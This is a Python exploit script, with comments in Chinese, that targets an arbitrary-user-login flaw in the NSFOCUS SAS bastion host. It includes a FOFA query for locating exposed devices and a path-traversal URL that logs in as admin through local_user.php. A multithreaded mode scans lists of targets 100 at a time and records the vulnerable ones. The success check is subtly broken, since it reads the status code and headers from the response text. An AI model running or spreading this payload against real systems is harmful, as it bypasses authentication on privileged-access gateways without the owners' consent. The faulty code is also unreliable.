# 绿盟SAS堡垒机local_user.php任意用户登录漏洞
# fofa: body="/login_logo_sas_h_zh_CN.png"

import requests, sys, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()  

def banner():
    pass 

def main():
    banner()
    parser = argparse.ArgumentParser(description="绿盟SAS堡垒机local_user.php任意用户登录漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input your file path')
    args = parser.parse_args() 
    if args.url and not args.file:
        poc(args.url)  
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)  
        mp.map(poc, url_list)  
        mp.close()  
        mp.join()  
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
    url = target + payload_url
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if res.status_code == 200 and '"status":200' in res.text and res.headers['Set-Cookie']:
            print(f'[+]该url:{target}存在任意用户登录漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在任意用户登录漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在任意用户登录漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')
    
if __name__ == '__main__':
    main()